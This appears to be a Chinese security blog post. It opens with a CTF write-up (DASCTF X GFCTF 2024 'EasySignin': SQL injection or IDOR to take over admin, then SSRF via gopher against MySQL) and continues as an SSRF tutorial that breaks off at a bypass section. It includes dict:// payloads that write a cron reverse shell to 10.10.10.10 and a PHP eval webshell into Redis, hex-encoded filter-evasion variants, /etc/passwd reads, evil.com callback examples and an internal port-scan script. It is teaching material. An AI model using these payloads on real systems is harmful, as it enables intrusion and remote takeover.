&lt;h2 id=&#34;dasctf-x-gfctf-2024-easysignin&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#dasctf-x-gfctf-2024-easysignin&#34;&gt;#&lt;/a&gt; DASCTF X GFCTF 2024 | EasySignin&lt;/h2&gt;
&lt;p&gt;首先复现一道最近比赛遇到的一道题&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/04/22/IWw2RAmLtjMisFH.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;经典登陆界面开局，先尝试 admin 123456，密码错误，注册一个 admin1 123456，登上去之后看好康的照片，不给看，权限不够，应该还是需要登录 admin，发现有一个更改密码的选项，可以利用一下&lt;/p&gt;
&lt;p&gt;这里有两种方式：&lt;/p&gt;
&lt;p&gt;1. 利用 sql 注入&lt;/p&gt;
&lt;p&gt;注册时用户名为 &lt;code&gt;admin&amp;quot;#&lt;/code&gt; 双引号会闭合前面的引号，# 注释掉后面的内容，此时登录之后更改密码实际会更改 &lt;code&gt;admin&lt;/code&gt;  的密码，在登陆 admin 就可以看了&lt;/p&gt;
&lt;p&gt;2.burp 抓包&lt;/p&gt;
&lt;p&gt;修改密码利用 bp 抓包&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/04/22/RuP9V7keCf3Kb8Y.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;发现会显示 username，且这里未验证 session 中的 username 和输入的 username 是否相同，那这里就存在逻辑漏洞了，可以尝试将 username 赋值为 admin，即可以越权修改 admin 的密码，修改密码后以 admin 密码登录。&lt;/p&gt;
&lt;p&gt;登录到 admin 之后查看好康的照片&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://img2.imgtp.com/2024/04/22/1YukL6P4.png&#34; alt=&#34;1713795160605.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;发现直接显示了文件的地址，下面就要用到 SSRF 的知识了，测试一下，过滤掉了 file、dict 等几个协议，但没过滤 gopher，可以用它探测服务和端口，探测到 3306 端口开放了 mysql 服务，这里 root 的密码为空，于是我们可以利用 gopher 协议去攻击 mysql。&lt;/p&gt;
&lt;p&gt;直接利用 Gopherus 查看根目录下的 flag 文件&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/04/22/Fpa2BKjsRrZeNw8.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;二次 url 编码，bp 抓包&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/04/22/DNrAxPlFmZ58GHu.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;base64 解码得到 flag： &lt;code&gt;DASCTF&amp;#123;39302405-b602-4b99-8101-66cd65424bbe&amp;#125;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/04/22/kgFEKOrs6Q7NxWP.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;ssrf-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssrf-2&#34;&gt;#&lt;/a&gt; SSRF&lt;/h2&gt;
&lt;h3 id=&#34;ssrf是什么&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssrf是什么&#34;&gt;#&lt;/a&gt; SSRF 是什么？&lt;/h3&gt;
&lt;p&gt;SSRF (Server-Side Request Forgery: 服务器端请求伪造) 是一种由攻击者构造形成由&lt;strong&gt;服务端&lt;/strong&gt;发起请求的一个安全漏洞。&lt;/p&gt;
&lt;p&gt;由于存在防火墙的防护，导致攻击者无法直接入侵内网；这时攻击者可以以服务器为跳板发起一些网络请求，从而攻击内网的应用及获取内网数据。&lt;/p&gt;
&lt;p&gt;一般情况下，SSRF 攻击的目标是&lt;strong&gt;从外网无法访问的内部系统&lt;/strong&gt;。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）&lt;/p&gt;
&lt;p&gt;SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。&lt;/p&gt;
&lt;p&gt;比如，黑客操作服务端从指定 URL 地址获取网页文本内容，加载指定地址的图片，下载等等。利用的是服务端的请求伪造。ssrf 是利用存在缺陷的 web 应用作为代理攻击远程和本地的服务器&lt;/p&gt;
&lt;h3 id=&#34;ssrf与csrf的区别&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssrf与csrf的区别&#34;&gt;#&lt;/a&gt; SSRF 与 CSRF 的区别&lt;/h3&gt;
&lt;p&gt;​    CSRF 是服务器端没有对用户提交的数据进行随机值校验，且对 http 请求包内的 refer 字段校验不严，导致攻击者可以利用用户的 cookie 信息伪造用户请求发送至服务器；&lt;/p&gt;
&lt;p&gt;​    SSRF 是服务器对用户提供的可控 URL 过于信任，没有对攻击者提供的 URL 进行地址限制和足够的检测，导致攻击者可以以此为跳板攻击内网或者其它服务器。&lt;/p&gt;
&lt;h3 id=&#34;ssrf中url的伪协议&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssrf中url的伪协议&#34;&gt;#&lt;/a&gt; SSRF 中 URL 的伪协议&lt;/h3&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;file:/// 从文件系统中获取文件内容，如:file:///etc/passwd&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dict:// 字典服务器协议，访问字典资源，如:dict:///ip:6739/info：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sftp:// SSH文件传输协议或安全文件传输协议&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ldap:// 轻量级目录访问协议&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tftp:// 简单文件传输协议&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gopher:// 分布式文档传递服务，可使用gopherus生成payload&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h4 id=&#34;1-file&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1-file&#34;&gt;#&lt;/a&gt; 1、file&lt;/h4&gt;
&lt;p&gt;这种 URL Schema 可以尝试从系统文件中获取文件&lt;/p&gt;
&lt;p&gt;&lt;code&gt;file://文件的绝对路径&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;http://example.com/ssrf.php?url=file:///etc/passwd&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://example.com/ssrf.php?url=file:///C:/Windows/win.ini&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&#34;2-dict&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2-dict&#34;&gt;#&lt;/a&gt; 2、dict&lt;/h4&gt;
&lt;p&gt;dict 协议一般常用来探测内网主机以及端口开放情况，既然能够探测端口，那么可以探测不同端口对应的服务的指纹信息。当然 dict 协议也可以用来执行一些服务的命令，如 redis&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;内网主机探测&lt;/li&gt;
&lt;li&gt;开放端口探测&lt;/li&gt;
&lt;li&gt;端口服务指纹探测&lt;/li&gt;
&lt;li&gt;执行命令&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;ditc://ip:port&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ditc://ip:port/命令&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;这种 URL Scheme 能够引用允许通过 DICT 协议使用的定义或单词列表：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://example.com/ssrf.php?dict://evil.com:1337/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;evil.com:$ nc -lvp 1337&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Connection from [192.168.0.12] port 1337[tcp/*]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;accepted (family 2, sport 31126)CLIENT libcurl 7.40.0&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h4 id=&#34;3-sftp&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3-sftp&#34;&gt;#&lt;/a&gt; 3、sftp&lt;/h4&gt;
&lt;p&gt;在这里，Sftp 代表 SSH 文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol），这是一种与 SSH 打包在一起的单独协议，它运行在安全连接上，并以类似的方式进行工作。&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;一、dict协议探测端口和服务指纹&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dict://127.0.0.1:22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dict://172.22.10.10:3306&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dict://127.0.0.1:6379/info&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;二、dict协议攻击redis，写入定时任务，进行反弹shell&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;centos系统定时任务的路径为：/var/spool/cron&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;debian系统定时任务的路径为：/var/spool/cron/crontabs&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dict://127.0.0.1:6379/config:set:dbfilename:root&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dict://127.0.0.1:6379/config:set:dir:/var/spool/cron&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dict://127.0.0.1:6379/set:test:&amp;quot;\n\n*/1 * * * * /bin/bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.10.10/1234 0&amp;gt;&amp;amp;1\n\n&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dict://127.0.0.1:6379/save&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;注意：若payload存在被转义或过滤的情况，可利用16进制写入内容&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dict://127.0.0.1:6379/set:test:&amp;quot;\n\n\x2a/1\x20\x2a\x20\x2a\x20\x2a\x20\x2a\x20/bin/bash\x20\x2di\x20\x3e\x26\x20/dev/tcp/10.10.10.10/1234\x200\x3e\x261\n\n&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;三、dict协议攻击redis，写入webshell&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dict://127.0.0.1:6379/config:set:dbfilename:test.php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dict://127.0.0.1:6379/config:set:dir:/var/www/html&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dict://127.0.0.1:6379/set:test:&amp;quot;\n\n&amp;lt;?php @eval($_POST[x]);?&amp;gt;\n\n&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dict://127.0.0.1:6379/save&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;若存在过滤， 则利用16进制内容写入：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dict://127.0.0.1:6379/set:test:&amp;quot;\n\n\x3c\x3f\x70\x68\x70\x20\x40\x65\x76\x61\x6c\x28\x24\x5f\x50\x4f\x53\x54\x5b\x78\x5d\x29\x3b\x3f\x3e\n\n&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;四、dict协议攻击redis，写入ssh公钥&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;操作和写入定时任务相似&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h4 id=&#34;4-gopher协议&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4-gopher协议&#34;&gt;#&lt;/a&gt; 4、gopher 协议&lt;/h4&gt;
&lt;p&gt;上面官方的说明了一下 gopher 协议介绍，具体如何在 ssrf 中使用呢？&lt;/p&gt;
&lt;p&gt;gopher 协议在 ssrf 的利用中一般用来攻击 redis，mysql，fastcgi，smtp 等服务。&lt;/p&gt;
&lt;p&gt;gopher 协议数据格式：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;gopher://ip:port/_TCP/IP数据流&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;注意：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;1.gopher 协议数据流中，url 编码使用 %0d%0a 替换字符串中的回车换行&lt;br&gt;
 2. 数据流末尾使用 %0d%0a 代表消息结束&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&#34;5-ldap或ldaps-或ldapi&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#5-ldap或ldaps-或ldapi&#34;&gt;#&lt;/a&gt; 5、ldap:// 或 ldaps:// 或 ldapi://&lt;/h4&gt;
&lt;p&gt;LDAP 代表轻量级目录访问协议。它是 IP 网络上的一种用于管理和访问分布式目录信息服务的应用程序协议。&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://example.com/ssrf.php?url=ldapi://localhost:1337/%0astats%0aquit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h4 id=&#34;6-tftp&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#6-tftp&#34;&gt;#&lt;/a&gt; 6、tftp://&lt;/h4&gt;
&lt;p&gt;TFTP（Trivial File Transfer Protocol, 简单文件传输协议）是一种简单的基于 lockstep 机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机。&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;evil.com:# nc -lvup 1337&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Listening on [0.0.0.0] (family 0, port1337)TESTUDPPACKEToctettsize0blksize512timeout3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h3 id=&#34;探测内网&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#探测内网&#34;&gt;#&lt;/a&gt; 探测内网&lt;/h3&gt;
&lt;p&gt;ssrf 最常见的就是探测内网，如果找到了内网 IP 的网段，可以尝试用暴力破解去探测内网的 IP，下面给出几种常见的探测方法。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;脚本&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这里贴一个通用的 python 脚本&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# -*- coding: utf-8 -*-&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; requests&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; time&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ports = [&lt;span class=&#34;string&#34;&gt;&amp;#x27;80&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;6379&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;3306&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;8080&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;8000&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;session = requests.Session();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;255&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; ip = &lt;span class=&#34;string&#34;&gt;&amp;#x27;192.168.0.%d&amp;#x27;&lt;/span&gt; % i &lt;span class=&#34;comment&#34;&gt;#内网ip地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; port &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; ports:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  url = &lt;span class=&#34;string&#34;&gt;&amp;#x27;http://ip/?url=http://%s:%s&amp;#x27;&lt;/span&gt; %(ip,port)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   res = session.get(url,timeout=&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(res.text) != &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; :    &lt;span class=&#34;comment&#34;&gt;#这里长度根据实际情况改&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(ip,port,&lt;span class=&#34;string&#34;&gt;&amp;#x27;is open&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;except&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;keyword&#34;&gt;continue&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Done&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;这里写的是爆破指定的一些端口和 IP 的 D 段，注意的是有些题目会给出端口的范围，就可以把 ports 改为 &lt;code&gt;range()&lt;/code&gt;  指定为一定的范围，然后返回的长度 &lt;code&gt;len(res.text)&lt;/code&gt;  要先自己测一下。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;burpsuite&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;可以选择用 burpsuite 软件中 Intruder 去爆破&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;nmap 工具&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;扫描目标开放端口，直接用 nmap 一把梭。&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;nmap -sV ip&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nmap -sV ip -p6379 //指定6379端口扫描&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h3 id=&#34;bypass&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#bypass&#34;&gt;#&lt;/a&gt; Bypass&lt;/h3&gt;
&lt;p&gt;经常会有题目 ban 掉 127.0.0.1 这个网址，需要进行绕过&lt;/p&gt;
